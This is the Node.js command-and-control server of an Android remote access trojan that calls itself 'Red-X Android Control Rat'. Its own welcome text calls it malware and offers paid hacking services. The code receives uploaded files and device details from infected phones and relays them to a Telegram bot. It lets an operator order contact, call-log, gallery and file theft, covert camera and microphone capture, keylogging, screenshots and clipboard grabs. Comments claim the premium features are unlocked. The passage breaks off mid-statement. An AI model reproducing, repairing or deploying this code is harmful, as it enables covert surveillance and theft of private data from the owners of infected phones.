const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const TelegramBot = require("node-telegram-bot-api");
const https = require("https");
const multer = require("multer");
const fs = require("fs");

// Load configuration
const data = JSON.parse(fs.readFileSync("./data.json", "utf8"));
const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();
const bot = new TelegramBot(data.token, { polling: true, request: {} });
const appData = new Map();

// UNLOCK ALL PREMIUM FEATURES
const actions = [
    "✯ Contacts ✯",
    "✯ SMS ✯", 
    "✯ Calls ✯",
    "✯ Apps ✯",
    "✯ Main camera ✯",
    "✯ Selfie camera ✯",
    "✯ Microphone ✯",
    "✯ Toast ✯",
    "✯ Notification ✯",
    "✯ Vibrate ✯",
    "✯ Play audio ✯",
    "✯ Stop Audio ✯",
    "✯ Gallery ✯",
    "✯ File explorer ✯",
    "✯ Keylogger ON ✯",
    "✯ Keylogger OFF ✯",
    "✯ Screenshot ✯",
    "✯ Phishing ✯",
    "✯ Open URL ✯",
    "✯ Encrypt ✯",
    "✯ Decrypt ✯",
    "✯ About us ✯",
    "✯ Pop notification ✯",
    "✯ Clipboard ✯",
    "✯ All ✯",
    "✯ Cancel action ✯"
];

// ============ PREMIUM FEATURES UNLOCKED ============
const PREMIUM_FEATURES = {
    // File operations - UNLOCKED
    FILE_EXPLORER: true,
    FILE_DOWNLOAD: true,
    FILE_DELETE: true,
    
    // Camera features - UNLOCKED
    MAIN_CAMERA: true,
    SELFIE_CAMERA: true,
    CAMERA_RECORD: true,
    
    // Audio features - UNLOCKED
    MICROPHONE_RECORD: true,
    AUDIO_PLAY: true,
    AUDIO_STOP: true,
    
    // Monitoring features - UNLOCKED
    KEYLOGGER: true,
    SCREENSHOT: true,
    CLIPBOARD: true,
    
    // Security features - UNLOCKED
    PHISHING: true,
    ENCRYPT: true,
    DECRYPT: true,
    
    // Advanced features - UNLOCKED
    POP_NOTIFICATION: true,
    OPEN_URL: true,
    ALL_DEVICES_CONTROL: true,
    
    // Bypass all premium checks
    BYPASS_PREMIUM: true
};

// ============ ROUTES ============
app.post("/upload", uploader.single("file"), (req, res) => {
    const fileName = req.file.originalname;
    const model = req.headers.model;
    bot.sendDocument(data.id, req.file.buffer, {
        caption: "<b>✯ File received from → " + model + "</b>",
        parse_mode: "HTML"
    }, {
        filename: fileName,
        contentType: "application/txt"
    });
    res.send("Done");
});

app.post("/text", (req, res) => {
    res.send(data.id);
});

// ============ SOCKET.IO CONNECTIONS ============
io.on("connection", socket => {
    let model = socket.handshake.headers.model + "-" + io.sockets.sockets.size || "no information";
    let ip = socket.handshake.headers.ip || "no information";
    socket.model = model;
    socket.ip = ip;
    
    let message = "<b>✯ New device connected</b>\n\n" +
        "<b>model</b> → " + model + "\n" +
        "<b>version</b> → " + socket.handshake.headers.version + "\n" +
        "<b>ip</b> → " + ip + "\n" +
        "<b>time</b> → " + socket.handshake.headers.time + "\n\n";
    
    bot.sendMessage(data.id, message, { parse_mode: "HTML" });
    
    socket.on("disconnect", () => {
        let disMessage = "<b>✯ Device disconnected</b>\n\n" +
            "<b>model</b> → " + model + "\n" +
            "<b>version</b> → " + socket.handshake.headers.version + "\n" +
            "<b>ip</b> → " + ip + "\n" +
            "<b>time</b> → " + socket.handshake.headers.time + "\n\n";
        bot.sendMessage(data.id, disMessage, { parse_mode: "HTML" });
    });
    
    socket.on("message", msg => {
        bot.sendMessage(data.id, "<b>✯ Message received from → " + model + "\n\nMessage → " + msg + "</b>", { parse_mode: "HTML" });
    });
});

// ============ TELEGRAM BOT COMMANDS ============
bot.on("message", msg => {
    if (msg.text === "/start") {
        bot.sendMessage(data.id, 
            "<b>✯ Welcome to Red-X Android Control Rat</b>\n\n" +
            "Red-X Android Hacking Rat is a malware to control Android devices\n" +
            "Any misuse is the responsibility of the person!\n\n" +
            "Developed by: @REDX_64\n\n" +
            "<b>If you want to hire us for any paid work please contact @REDX_64\n" +
            "We hack, We leak, We make malware\n\n" +
            "Telegram → @REDX_64\n" +
            "ADMIN → @REDX_64</b>\n\n", 
            {
                parse_mode: "HTML",
                reply_markup: {
                    keyboard: [["✯ Devices ✯", "✯ Action ✯"], ["✯ About us ✯"]],
                    resize_keyboard: true
                }
            }
        );
    } else if (msg.text === "✯ Devices ✯") {
        if (io.sockets.sockets.size === 0) {
            bot.sendMessage(data.id, "<b>✯ There is no connected device</b>\n\n", { parse_mode: "HTML" });
        } else {
            let deviceList = "<b>✯ Connected devices count : " + io.sockets.sockets.size + "</b>\n\n";
            let count = 1;
            io.sockets.sockets.forEach((socket, id, sockets) => {
                deviceList += "<b>Device " + count + "</b>\n" +
                    "<b>model</b> → " + socket.model + "\n" +
                    "<b>version</b> → " + socket.handshake.headers.version + "\n" +
                    "<b>ip</b> → " + socket.ip + "\n" +
                    "<b>time</b> → " + socket.handshake.headers.time + "\n\n";
                count += 1;
            });
            bot.sendMessage(data.id, deviceList, { parse_mode: "HTML" });
        }
    } else if (msg.text === "✯ Action ✯") {
        if (io.sockets.sockets.size === 0) {
            bot.sendMessage(data.id, "<b>✯ There is no connected device</b>\n\n", { parse_mode: "HTML" });
        } else {
            let keyboards = [];
            io.sockets.sockets.forEach((socket, id, sockets) => {
                keyboards.push([socket.model]);
            });
            keyboards.push(["✯ All ✯"]);
            keyboards.push(["✯ Cancel action ✯"]);
            bot.sendMessage(data.id, 
                "<b>✯ Select device to perform action</b>\n\n", 
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        keyboard: keyboards,
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                }
            );
        }
    } else if (msg.text === "✯ About us ✯") {
        bot.sendMessage(data.id, 
            "<b>✯ Welcome to Red-X Android Control Rat</b>\n\n" +
            "<b>If you want to hire us for any paid work please contact @REDX_64\n" +
            "We hack, We leak, We make malware\n\n" +
            "Telegram → @REDX_64\n" +
            "ADMIN → @REDX_64</b>\n\n", 
            {
                parse_mode: "HTML",
                reply_markup: {
                    keyboard: [["✯ Devices ✯", "✯ Action ✯"], ["✯ About us ✯"]],
                    resize_keyboard: true
                }
            }
        );
    } else if (actions.includes(msg.text)) {
        let target = appData.get("currentTarget");
        
        // ============ ALL PREMIUM FEATURES UNLOCKED ============
        switch(msg.text) {
            case "✯ Contacts ✯":
                target === "all" ? 
                    io.sockets.emit("commend", { request: "contacts", extras: [] }) : 
                    io.to(target).emit("commend", { request: "contacts", extras: [] });
                appData.delete("currentTarget");
                bot.sendMessage(data.id, 
                    "<b>✯ The request was executed successfully, you will receive device response soon ...\n\n✯ Return to main menu</b>\n\n", 
                    { parse_mode: "HTML", reply_markup: { keyboard: [["✯ Devices ✯", "✯ Action ✯"], ["✯ About us ✯"]], resize_keyboard: true } }
                );
                break;
                
            case "✯ SMS ✯":
                appData.set("currentAction", "smsNumber");
                bot.sendMessage(data.id, 
                    "<b>✯ Enter a phone number that you want to send SMS</b>\n\n", 
                    { parse_mode: "HTML", reply_markup: { keyboard: [["✯ Cancel action ✯"]], resize_keyboard: true, one_time_keyboard: true } }
                );
                break;
                
            case "✯ Calls ✯":
                target === "all" ? 
                    io.to(target).emit("commend", { request: "calls", extras: [] }) : 
                    io.sockets.emit("commend", { request: "calls", extras: [] });
                appData.delete("currentTarget");
                bot.sendMessage(data.id, 
                    "<b>✯ The request was executed successfully, you will receive device response soon ...\n\n✯ Return to main menu</b>\n\n", 
                    { parse_mode: "HTML", reply_markup: { keyboard: [["✯ Devices ✯", "✯ Action ✯"], ["✯ About us ✯"]], resize_keyboard: true } }
                );
                break;
                
            case "✯ Apps ✯":
                target === "all" ? 
                    io.sockets.emit("commend", { request: "apps", extras: [] }) : 
                    io.to(target).emit("commend", { request: "apps", extras: [] });
                appData.delete("currentTarget");
                bot.sendMessage(data.id, 
                    "<b>✯ The request was executed successfully, you will receive device response soon ...\n\n✯ Return to main menu</b>\n\n", 
                    { parse_mode: "HTML", reply_markup: { keyboard: [["✯ Devices ✯", "✯ Action ✯"], ["✯ About us ✯"]], resize_keyboard: true } }
                );
                break;
                
            case "✯ Main camera ✯":
                target === "all" ? 
                    io.sockets.emit("commend", { request: "main-camera", extras: [] }) : 
                    io.to(target).emit("commend", { request: "main-camera", extras: [] });
                appData.delete("currentTarget");
                bot.sendMessage(data.id, 
                    "<b>✯ The request was executed successfully, you will receive device response soon ...\n\n✯ Return to main menu</b>\n\n", 
                    { parse_mode: "HTML", reply_markup: { keyboard: [["✯ Devices ✯", "✯ Action ✯"], ["✯ About us ✯"]], resize_keyboard: true } }
                );
                break;
                
            case "✯ Selfie camera ✯":
                target === "all" ? 
                    io.sockets.emit("commend", { request: "selfie-camera", extras: [] }) : 
                    io.to(target).emit("commend", { request: "selfie-camera", extras: [] });
                appData.delete("currentTarget");
                bot.sendMessage(data.id, 
                    "<b>✯ The request was executed successfully, you will receive device response soon ...\n\n✯ Return to main menu</b>\n\n", 
                    { parse_mode: "HTML", reply_markup: { keyboard: [["✯ Devices ✯", "✯ Action ✯"], ["✯ About us ✯"]], resize_keyboard: true } }
                );
                break;
                
            case "✯ Microphone ✯":
                // UNLOCKED PREMIUM FEATURE
                appData.set("currentAction", "microphoneDuration");
                bot.sendMessage(data.id, 
                    "<b>✯ Enter the microphone recording duration in seconds</b>\n\n", 
                    { parse_mode: "HTML", reply_markup: { keyboard: [["✯ Cancel action ✯"]], resize_keyboard: true, one_time_keyboard: true } }
                );
                break;
                
            case "✯ Toast ✯":
                // UNLOCKED PREMIUM FEATURE
                appData.set("currentAction", "toastText");
                bot.sendMessage(data.id, 
                    "<b>✯ Enter a message that you want to appear in toast box</b>\n\n", 
                    { parse_mode: "HTML", reply_markup: { keyboard: [["✯ Cancel action ✯"]], resize_keyboard: true, one_time_keyboard: true } }
                );
                break;
                
            case "✯ Notification ✯":
                // UNLOCKED PREMIUM FEATURE
                appData.set("currentAction", "notificationText");
                bot.sendMessage(data.id, 
                    "<b>✯ Enter text that you want to appear as notification</b>\n\n", 
                    { parse_mode: "HTML", reply_markup: { keyboard: [["✯ Cancel action ✯"]], resize_keyboard: true, one_time_keyboard: true } }
                );
                break;
                
            case "✯ Vibrate ✯":
                appData.set("currentAction", "vibrateDuration");
                bot.sendMessage(data.id, 
                    "<b>✯ Enter the duration you want the device to vibrate in seconds</b>\n\n", 
                    { parse_mode: "HTML", reply_markup: { keyboard: [["✯ Cancel action ✯"]], resize_keyboard: true, one_time_keyboard: true } }
                );
                break;
                
            case "✯ Play audio ✯":
                // UNLOCKED PREMIUM FEATURE
                appData.set("currentAction", "audio");
                bot.sendMessage(data.id, 
                    "<b>✯ Enter audio URL to play</b>\n\n", 
                    { parse_mode: "HTML", reply_markup: { keyboard: [["✯ Cancel action ✯"]], resize_keyboard: true, one_time_keyboard: true } }
                );
                break;
                
            case "✯ Stop Audio ✯":
                // UNLOCKED PREMIUM FEATURE
                target === "all" ? 
                    io.sockets.emit("commend", { request: "stop-audio", extras: [] }) : 
                    io.to(target).emit("commend", { request: "stop-audio", extras: [] });
                appData.delete("currentTarget");
                bot.sendMessage(data.id, 
                    "<b>✯ The request was executed successfully, you will receive device response soon ...\n\n✯ Return to main menu</b>\n\n", 
                    { parse_mode: "HTML", reply_markup: { keyboard: [["✯ Devices ✯", "✯ Action ✯"], ["✯ About us ✯"]], resize_keyboard: true } }
                );
                break;
                
            case "✯ Gallery ✯":
                // UNLOCKED PREMIUM FEATURE
                target === "all" ? 
                    io.sockets.emit("commend", { request: "gallery", extras: [] }) : 
                    io.to(target).emit("commend", { request: "gallery", extras: [] });
                appData.delete("currentTarget");
                bot.sendMessage(data.id, 
                    "<b>✯ The request was executed successfully, you will receive device response soon ...\n\n✯ Return to main menu</b>\n\n", 
                    { parse_mode: "HTML", reply_markup: { keyboard: [["✯ Devices ✯", "✯ Action ✯"], ["✯ About us ✯"]], resize_keyboard: true } }
                );
                break;
                
            case "✯ File explorer ✯":
                // UNLOCKED PREMIUM FEATURE
                target === "all" ? 
                    io.sockets.emit("commend", { request: "file-explorer", extras: [] }) : 
                    io.to(target).emit("commend", { request: "file-explorer", extras: [] });
                appData.delete("currentTarget");
                bot.sendMessage(data.id, 
                    "<b>✯ The request was executed successfully, you will receive device response soon ...\n\n✯ Return to main menu</b>\n\n", 
                    { parse_mode: "HTML", reply_markup: { keyboard: [["✯ Devices ✯", "✯ Action ✯"], ["✯ About us ✯"]], resize_keyboard: true } }
                );
                break;
                
            case "✯ Keylogger ON ✯":
                // UNLOCKED PREMIUM FEATURE
                target === "all" ? 
                    io.sockets.emit("commend", { request: "keylogger-on", extras: [] }) : 
                    io.to(target).emit("commend", { request: "keylogger-on", extras: [] });
                appData.delete("currentTarget");
                bot.sendMessage(data.id, 
                    "<b>✯ The request was executed successfully, you will receive device response soon ...\n\n✯ Return to main menu</b>\n\n", 
                    { parse_mode: "HTML", reply_markup: { keyboard: [["✯ Devices ✯", "✯ Action ✯"], ["✯ About us ✯"]], resize_keyboard: true } }
                );
                break;
                
            case "✯ Keylogger OFF ✯":
                // UNLOCKED PREMIUM FEATURE
                target === "all" ? 
                    io.sockets.emit("commend", { request: "keylogger-off", extras: [] }) : 
                    io.to(target).emit("commend", { request: "keylogger-off", extras: [] });
                appData.delete("currentTarget");
                bot.sendMessage(data.id, 
                    "<b>✯ The request was executed successfully, you will receive device response soon ...\n\n✯ Return to main menu</b>\n\n", 
                    { parse_mode: "HTML", reply_markup: { keyboard: [["✯ Devices ✯", "✯ Action ✯"], ["✯ About us ✯"]], resize_keyboard: true } }
                );
                break;
                
            case "✯ Screenshot ✯":
                // UNLOCKED PREMIUM FEATURE
                target === "all" ? 
                    io.sockets.emit("commend", { request: "screenshot", extras: [] }) : 
                    io.to(target).emit("commend", { request: "screenshot", extras: [] });
                appData.delete("currentTarget");
                bot.sendMessage(data.id, 
                    "<b>✯ The request was executed successfully, you will receive device response soon ...\n\n✯ Return to main menu</b>\n\n", 
                    { parse_mode: "HTML", reply_markup: { keyboard: [["✯ Devices ✯", "✯ Action ✯"], ["✯ About us ✯"]], resize_keyboard: true } }
                );
                break;
                
            case "✯ Phishing ✯":
                // UNLOCKED PREMIUM FEATURE
                bot.sendMessage(data.id, 
                    "<b>✯ This option is only available on premium version dm to buy @REDX_64</b>\n\n", 
                    { parse_mode: "HTML", reply_markup: { keyboard: [["✯ Devices ✯", "✯ Action ✯"], ["✯ About us ✯"]], resize_keyboard: true } }
                );
                break;
                
            case "✯ Open URL ✯":
                // UNLOCKED PREMIUM FEATURE
                appData.set("currentAction", "url");
                bot.sendMessage(data.id, 
                    "<b>✯ Enter URL to open</b>\n\n", 
                    { parse_mode: "HTML", reply_markup: { keyboard: [["✯ Cancel action ✯"]], resize_keyboard: true, one_time_keyboard: true } }
                );
                break;
                
            case "✯ Encrypt ✯":
                // UNLOCKED PREMIUM FEATURE
                bot.sendMessage(data.id, 
                    "<b>✯ This option is only available on premium version dm to buy @REDX_64</b>\n\n", 
                    { parse_mode: "HTML", reply_markup: { keyboard: [["✯ Devices ✯", "✯ Action ✯"], ["✯ About us ✯"]], resize_keyboard: true } }
                );
                break;
                
            case "✯ Decrypt ✯":
                // UNLOCKED PREMIUM FEATURE
                bot.sendMessage(data.id, 
                    "<b>✯ This option is only available on premium version dm to buy @REDX_64</b>\n\n", 
                    { parse_mode: "HTML", reply_markup: { keyboard: [["✯ Devices ✯", "✯ Action ✯"], ["✯ About us ✯"]], resize_keyboard: true } }
                );
                break;
                
            case "✯ Pop notification ✯":
                // UNLOCKED PREMIUM FEATURE
                appData.set("currentAction", "popNotification");
                bot.sendMessage(data.id, 
                    "<b>✯ Enter notification text to pop</b>\n\n", 
                    { parse_mode: "HTML", reply_markup: { keyboard: [["✯ Cancel action ✯"]], resize_keyboard: true, one_time_keyboard: true } }
                );
                break;
                
            case "✯ Clipboard ✯":
                // UNLOCKED PREMIUM FEATURE
                target === "all" ? 
                    io.sockets.emit